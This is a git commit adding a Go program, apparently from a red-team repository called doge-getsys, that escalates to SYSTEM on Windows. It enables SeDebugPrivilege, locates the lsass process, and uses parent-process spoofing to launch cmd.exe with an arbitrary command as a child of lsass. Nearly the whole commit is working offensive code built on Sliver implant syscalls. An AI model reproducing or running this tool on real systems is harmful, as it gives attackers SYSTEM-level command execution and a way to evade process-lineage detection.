0fa33d0cd9b6789a1114d6952c7baea9547686cd
TimWhite <36320909+timwhitez@users.noreply.github.com>
2021-08-23 17:48:52 +0800

    add CreateProcessAsUser
    add CreateProcessAsUser

---
+++ CreateProcessAsUser/CreateProcessAsUser.go
@@ -0,0 +1,152 @@
+package main
+
+import (
+	"fmt"
+	"github.com/bishopfox/sliver/implant/sliver/syscalls"
+	wins "github.com/cloudfoundry/gosigar/sys/windows"
+	"golang.org/x/sys/windows"
+	"log"
+	"os"
+	"strings"
+	"syscall"
+	"time"
+	"unsafe"
+
+	ps "github.com/mitchellh/go-ps"
+)
+
+func getpid(pname []string) int {
+	target_procs := pname
+	processList, err := ps.Processes()
+	if err != nil {
+		fmt.Println("ps.Processes() Failed, are you using windows?")
+		return 0
+	}
+	for _,proc := range target_procs {
+		for x := range processList {
+			var process ps.Process
+			process = processList[x]
+			if strings.Contains(process.Executable(), proc) {
+				return process.Pid()
+			} else {
+				// sleep to limit cpu usage
+				time.Sleep(5 * time.Millisecond)
+			}
+
+		}
+	}
+	return 0
+}
+
+func enableSeDebugPrivilege() error {
+	self, err := syscall.GetCurrentProcess()
+	if err != nil {
+		return err
+	}
+
+	var token syscall.Token
+	err = syscall.OpenProcessToken(self, syscall.TOKEN_QUERY|syscall.TOKEN_ADJUST_PRIVILEGES, &token)
+	if err != nil {
+		return err
+	}
+
+	if err = wins.EnableTokenPrivileges(token, wins.SeDebugPrivilege); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func main(){
+	var cmdArgs string
+	if len(os.Args) == 2{
+		cmdline := os.Args[1]
+		//cmdArgs, _ = syscall.UTF16PtrFromString("/c "+cmdline)
+		cmdArgs = "/c "+cmdline
+	}else{
+		//cmdArgs, _ = syscall.UTF16PtrFromString("")
+		cmdArgs=""
+	}
+
+	target := "C:\\Windows\\System32\\cmd.exe "+ cmdArgs
+	commandLine, err := syscall.UTF16PtrFromString(target)
+
+
+	targetPID := getpid([]string{"lsass"})
+
+	if targetPID == 0{
+		fmt.Println("未找到\"lsass\"进程")
+		return
+	}
+
+	e := enableSeDebugPrivilege()
+	if e != nil{
+		log.Printf("SeDebugPrivilege failed: %v\n", e)
+		return
+	}
+
+
+
+	procThreadAttributeSize := uintptr(0)
+	_ = syscalls.InitializeProcThreadAttributeList(nil, 1, 0, &procThreadAttributeSize)
+	//siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+	procHeap, _ := syscalls.GetProcessHeap()
+	attributeList, _ := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
+	defer syscalls.HeapFree(procHeap, 0, attributeList)
+	var startupInfo syscalls.StartupInfoEx
+	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
+
+	_ = syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 1, 0, &procThreadAttributeSize)
+
+
+	//IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
+	handle, err := syscall.OpenProcess( 0x000000080|0x00000040, false, uint32(targetPID))
+	if err != nil{
+		log.Printf("OpenProcess failed: %v\n", err)
+		return
+	}
+
+
+
+	lpValueProc := uintptr(handle)
+	//UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+	_ = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(0x00020000), &lpValueProc, unsafe.Sizeof(lpValueProc), 0, nil)
+
+	var procInfo windows.ProcessInformation
+	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
+	var hTokenDup windows.Token
+	//bool ret = CreateProcess(binaryPath, null, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref siEx, out pInfo);
+	/*
+	if err = syscalls.CreateProcess(
+		commandLine,
+		cmdArgs,
+		nil,
+		nil,
+		true,
+		0x00080000|0x00000010,
+		nil,
+		nil,
+		&startupInfo,
+		&procInfo);
+		err != nil {
+		log.Printf("CreateProcess failed: %v\n", err)
+	}
+*/
+	err = windows.CreateProcessAsUser(
+		hTokenDup, //token Token,
+		nil,  //appName *uint16,
+		commandLine,  //commandLine *uint16,
+		nil,  //procSecurity *SecurityAttributes,
+		nil,  //threadSecurity *SecurityAttributes, //inheritHandles bool,
+		true,
+		0x00080000|0x00000010,  //creationFlags uint32,
+		nil, //env *uint16,
+		nil,   //currentDir *uint16,
+		&startupInfo.StartupInfo, //startupInfo *StartupInfo,
+		&procInfo) //outProcInfo *ProcessInformation
+
+		if err != nil {
+		log.Printf("CreateProcess failed: %v\n", err)
+	}
+
+}
---
+++ CreateProcessAsUser/go.mod
@@ -0,0 +1,10 @@
+module github.com/timwhitez/doge-getsys
+
+go 1.16
+
+require (
+	github.com/bishopfox/sliver v1.4.20
+	github.com/cloudfoundry/gosigar v1.2.0
+	github.com/mitchellh/go-ps v1.0.0
+	golang.org/x/sys v0.0.0-20210809222454-d867a43fc93e
+)
